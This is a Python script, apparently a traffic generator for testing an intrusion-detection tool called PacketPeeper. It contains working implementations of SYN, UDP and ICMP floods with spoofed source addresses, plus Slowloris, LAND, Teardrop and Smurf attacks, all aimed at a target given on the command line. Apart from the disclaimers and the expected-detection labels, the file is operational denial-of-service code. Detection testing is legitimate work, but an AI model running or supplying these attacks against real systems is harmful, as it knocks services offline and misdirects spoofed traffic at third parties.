#!/usr/bin/env python3
"""
DoS Attack Simulation - Tests detection of Denial of Service attacks
For EDUCATIONAL and AUTHORIZED TESTING purposes only!
"""

import argparse
import time
import random
import socket
import threading
import sys
from typing import Optional

try:
    from scapy.all import *
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("[!] Scapy not installed. Some features limited.")


class DoSAttacks:
    """Simulates various DoS attack patterns for detection testing"""
    
    def __init__(self, target: str, port: int = 80):
        self.target = target
        self.port = port
        self.running = False
        self.packet_count = 0
        
    def _random_ip(self) -> str:
        """Generate random source IP for spoofing simulation"""
        return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    
    def syn_flood(self, duration: int = 10, rate: int = 100) -> None:
        """
        SYN Flood Attack - Overwhelms target with SYN packets
        Detection: High rate of SYN packets, many half-open connections
        Severity: CRITICAL
        """
        print(f"\n[*] Starting SYN Flood on {self.target}:{self.port}")
        print(f"[*] Duration: {duration}s, Rate: ~{rate} pps")
        print("[*] Expected Detection: SYN_FLOOD / DDOS_ATTACK")
        
        self.running = True
        self.packet_count = 0
        start_time = time.time()
        
        if SCAPY_AVAILABLE:
            while self.running and (time.time() - start_time) < duration:
                try:
                    # Randomize source IP and port to simulate DDoS
                    src_ip = self._random_ip()
                    src_port = random.randint(1024, 65535)
                    
                    pkt = IP(src=src_ip, dst=self.target)/TCP(
                        sport=src_port,
                        dport=self.port,
                        flags="S",
                        seq=random.randint(0, 2**32-1)
                    )
                    send(pkt, verbose=0)
                    self.packet_count += 1
                    
                    if self.packet_count % 100 == 0:
                        print(f"    [SYN FLOOD] Sent {self.packet_count} packets...")
                        
                    time.sleep(1/rate)
                except Exception as e:
                    print(f"    [!] Error: {e}")
                    break
        else:
            # Fallback without scapy
            while self.running and (time.time() - start_time) < duration:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.setblocking(False)
                    sock.connect_ex((self.target, self.port))
                    sock.close()
                    self.packet_count += 1
                    
                    if self.packet_count % 100 == 0:
                        print(f"    [SYN FLOOD] Sent {self.packet_count} packets...")
                        
                    time.sleep(1/rate)
                except:
                    pass
                    
        self.running = False
        print(f"[+] SYN Flood complete - Sent {self.packet_count} packets")
    
    def udp_flood(self, duration: int = 10, rate: int = 100) -> None:
        """
        UDP Flood Attack - Floods target with UDP packets
        Detection: High rate of UDP packets to random ports
        Severity: CRITICAL
        """
        print(f"\n[*] Starting UDP Flood on {self.target}")
        print(f"[*] Duration: {duration}s, Rate: ~{rate} pps")
        print("[*] Expected Detection: UDP_FLOOD / DDOS_ATTACK")
        
        self.running = True
        self.packet_count = 0
        start_time = time.time()
        
        # Random payload
        payload = random._urandom(1024)
        
        if SCAPY_AVAILABLE:
            while self.running and (time.time() - start_time) < duration:
                try:
                    src_ip = self._random_ip()
                    dst_port = random.randint(1, 65535)
                    
                    pkt = IP(src=src_ip, dst=self.target)/UDP(
                        sport=random.randint(1024, 65535),
                        dport=dst_port
                    )/Raw(load=payload[:random.randint(64, 1024)])
                    
                    send(pkt, verbose=0)
                    self.packet_count += 1
                    
                    if self.packet_count % 100 == 0:
                        print(f"    [UDP FLOOD] Sent {self.packet_count} packets...")
                        
                    time.sleep(1/rate)
                except Exception as e:
                    print(f"    [!] Error: {e}")
                    break
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while self.running and (time.time() - start_time) < duration:
                try:
                    dst_port = random.randint(1, 65535)
                    sock.sendto(payload, (self.target, dst_port))
                    self.packet_count += 1
                    
                    if self.packet_count % 100 == 0:
                        print(f"    [UDP FLOOD] Sent {self.packet_count} packets...")
                        
                    time.sleep(1/rate)
                except:
                    pass
            sock.close()
                    
        self.running = False
        print(f"[+] UDP Flood complete - Sent {self.packet_count} packets")
    
    def icmp_flood(self, duration: int = 10, rate: int = 50) -> None:
        """
        ICMP Flood (Ping Flood) - Floods target with ICMP echo requests
        Detection: Abnormally high ICMP traffic
        Severity: HIGH
        """
        print(f"\n[*] Starting ICMP Flood on {self.target}")
        print(f"[*] Duration: {duration}s, Rate: ~{rate} pps")
        print("[*] Expected Detection: ICMP_FLOOD / PING_FLOOD")
        
        if not SCAPY_AVAILABLE:
            print("[!] ICMP Flood requires Scapy")
            return
            
        self.running = True
        self.packet_count = 0
        start_time = time.time()
        
        while self.running and (time.time() - start_time) < duration:
            try:
                src_ip = self._random_ip()
                
                # Large ICMP payload
                pkt = IP(src=src_ip, dst=self.target)/ICMP()/Raw(load="X" * 1400)
                send(pkt, verbose=0)
                self.packet_count += 1
                
                if self.packet_count % 50 == 0:
                    print(f"    [ICMP FLOOD] Sent {self.packet_count} packets...")
                    
                time.sleep(1/rate)
            except Exception as e:
                print(f"    [!] Error: {e}")
                break
                
        self.running = False
        print(f"[+] ICMP Flood complete - Sent {self.packet_count} packets")
    
    def slowloris(self, duration: int = 30, connections: int = 50) -> None:
        """
        Slowloris Attack - Keeps many connections open with partial HTTP requests
        Detection: Many long-lived connections with incomplete requests
        Severity: HIGH
        """
        print(f"\n[*] Starting Slowloris on {self.target}:{self.port}")
        print(f"[*] Duration: {duration}s, Connections: {connections}")
        print("[*] Expected Detection: SLOWLORIS / SLOW_HTTP_ATTACK")
        
        self.running = True
        sockets = []
        
        # Create initial connections
        print(f"    [SLOWLORIS] Creating {connections} connections...")
        for _ in range(connections):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.target, self.port))
                sock.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {self.target}\r\n".encode())
                sock.send("User-Agent: Mozilla/5.0\r\n".encode())
                sockets.append(sock)
            except:
                pass
        
        print(f"    [SLOWLORIS] Established {len(sockets)} connections")
        
        start_time = time.time()
        while self.running and (time.time() - start_time) < duration:
            # Keep connections alive by sending partial headers
            for sock in sockets[:]:
                try:
                    sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                except:
                    sockets.remove(sock)
                    # Try to replace lost connection
                    try:
                        new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        new_sock.settimeout(5)
                        new_sock.connect((self.target, self.port))
                        new_sock.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
                        sockets.append(new_sock)
                    except:
                        pass
            
            print(f"    [SLOWLORIS] Maintaining {len(sockets)} connections...")
            time.sleep(10)  # Send keep-alive every 10 seconds
        
        # Cleanup
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
                
        self.running = False
        print(f"[+] Slowloris complete")
    
    def land_attack(self, count: int = 100) -> None:
        """
        LAND Attack - Sends packets with same source and destination
        Detection: Source IP equals destination IP
        Severity: MEDIUM (mostly mitigated on modern systems)
        """
        print(f"\n[*] Starting LAND Attack on {self.target}")
        print(f"[*] Count: {count} packets")
        print("[*] Expected Detection: LAND_ATTACK / SPOOFED_SOURCE")
        
        if not SCAPY_AVAILABLE:
            print("[!] LAND Attack requires Scapy")
            return
            
        self.packet_count = 0
        
        for _ in range(count):
            try:
                # Source IP = Destination IP
                pkt = IP(src=self.target, dst=self.target)/TCP(
                    sport=self.port,
                    dport=self.port,
                    flags="S"
                )
                send(pkt, verbose=0)
                self.packet_count += 1
                
                if self.packet_count % 20 == 0:
                    print(f"    [LAND] Sent {self.packet_count} packets...")
                    
                time.sleep(0.01)
            except Exception as e:
                print(f"    [!] Error: {e}")
                break
                
        print(f"[+] LAND Attack complete - Sent {self.packet_count} packets")
    
    def teardrop(self, count: int = 50) -> None:
        """
        Teardrop Attack - Sends fragmented packets with overlapping offsets
        Detection: Malformed/overlapping IP fragments
        Severity: MEDIUM (mostly mitigated)
        """
        print(f"\n[*] Starting Teardrop Attack on {self.target}")
        print(f"[*] Count: {count} packets")
        print("[*] Expected Detection: TEARDROP / FRAGMENTATION_ATTACK")
        
        if not SCAPY_AVAILABLE:
            print("[!] Teardrop Attack requires Scapy")
            return
            
        self.packet_count = 0
        
        for _ in range(count):
            try:
                # First fragment
                pkt1 = IP(dst=self.target, flags="MF", frag=0)/UDP(dport=self.port)/Raw(load="A"*48)
                # Overlapping fragment
                pkt2 = IP(dst=self.target, frag=3)/Raw(load="B"*48)  # Overlapping offset
                
                send(pkt1, verbose=0)
                send(pkt2, verbose=0)
                self.packet_count += 2
                
                if self.packet_count % 20 == 0:
                    print(f"    [TEARDROP] Sent {self.packet_count} packets...")
                    
                time.sleep(0.05)
            except Exception as e:
                print(f"    [!] Error: {e}")
                break
                
        print(f"[+] Teardrop Attack complete - Sent {self.packet_count} packets")
    
    def smurf_attack(self, count: int = 50) -> None:
        """
        Smurf Attack - ICMP broadcast with spoofed source
        Detection: ICMP echo requests to broadcast with spoofed source
        Severity: MEDIUM (mostly mitigated)
        """
        print(f"\n[*] Starting Smurf Attack simulation")
        print(f"[*] Count: {count} packets")
        print("[*] Expected Detection: SMURF_ATTACK / ICMP_AMPLIFICATION")
        
        if not SCAPY_AVAILABLE:
            print("[!] Smurf Attack requires Scapy")
            return
            
        self.packet_count = 0
        broadcast = "255.255.255.255"
        
        for _ in range(count):
            try:
                # Spoof source as target, send to broadcast
                pkt = IP(src=self.target, dst=broadcast)/ICMP()
                send(pkt, verbose=0)
                self.packet_count += 1
                
                if self.packet_count % 10 == 0:
                    print(f"    [SMURF] Sent {self.packet_count} packets...")
                    
                time.sleep(0.1)
            except Exception as e:
                print(f"    [!] Error: {e}")
                break
                
        print(f"[+] Smurf Attack complete - Sent {self.packet_count} packets")


def main():
    parser = argparse.ArgumentParser(description="DoS Attack Simulator for Detection Testing")
    parser.add_argument("--target", "-t", default="127.0.0.1", help="Target IP address")
    parser.add_argument("--port", "-p", type=int, default=80, help="Target port")
    parser.add_argument("--type", "-T", default="synflood",
                        choices=["synflood", "udpflood", "icmpflood", "slowloris", 
                                "land", "teardrop", "smurf", "all"],
                        help="Attack type")
    parser.add_argument("--duration", "-d", type=int, default=10, help="Attack duration in seconds")
    parser.add_argument("--rate", "-r", type=int, default=100, help="Packets per second")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("  DoS ATTACK SIMULATOR - Detection Testing Tool")
    print("  ⚠️  WARNING: For authorized testing only!")
    print("=" * 60)
    print(f"  Target: {args.target}:{args.port}")
    print(f"  Attack Type: {args.type}")
    print(f"  Duration: {args.duration}s")
    print("=" * 60)
    
    dos = DoSAttacks(args.target, args.port)
    
    try:
        if args.type == "synflood" or args.type == "all":
            dos.syn_flood(args.duration, args.rate)
        if args.type == "udpflood" or args.type == "all":
            dos.udp_flood(args.duration, args.rate)
        if args.type == "icmpflood" or args.type == "all":
            dos.icmp_flood(args.duration, args.rate // 2)
        if args.type == "slowloris" or args.type == "all":
            dos.slowloris(args.duration, 50)
        if args.type == "land" or args.type == "all":
            dos.land_attack(100)
        if args.type == "teardrop" or args.type == "all":
            dos.teardrop(50)
        if args.type == "smurf" or args.type == "all":
            dos.smurf_attack(50)
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
        dos.running = False
    
    print("\n[*] Attack simulation complete. Check PacketPeeper for detections!")


if __name__ == "__main__":
    main()
